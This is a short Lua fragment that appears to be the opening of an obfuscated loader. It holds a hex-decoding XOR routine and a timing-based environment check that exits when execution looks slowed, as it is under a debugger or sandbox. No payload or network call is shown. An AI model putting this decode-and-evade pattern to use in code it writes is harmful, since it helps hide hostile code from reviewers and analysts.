local sb,sc=string.byte,string.char
local function DEC(h,k)
  local n=#h local m={} local i=1
  while i<n do
    local hi=sb(h,i) local lo=sb(h,i+1)
    hi=(hi>=97) and (hi-87) or ((hi>=65) and (hi-55) or (hi-48))
    lo=(lo>=97) and (lo-87) or ((lo>=65) and (lo-55) or (lo-48))
    local v=hi*16+lo
    local kk=k[((i-1)/2)%#k+1]
    local r,p=0,1 local x,y=v,kk
    while x>0 or y>0 do
      local xa,ya=x%2,y%2
      if xa~=ya then r=r+p end
      x=(x-xa)/2 y=(y-ya)/2 p=p*2
    end
    m[#m+1]=sc(r) i=i+2
  end
  return table.concat(m)
end
local function ENVOK()
  local E=getfenv and getfenv(0) or _G
  if not E.table or not E.string then return false end
  local t0=E.os and E.os.clock and E.os.clock() or 0
  local s=0 for i=1,150000 do s=s+i end
  local dt=E.os and E.os.clock and (E.os.clock()-t0) or 0
  if dt>3 then return false end
  return true
end
if not ENVOK() then return end
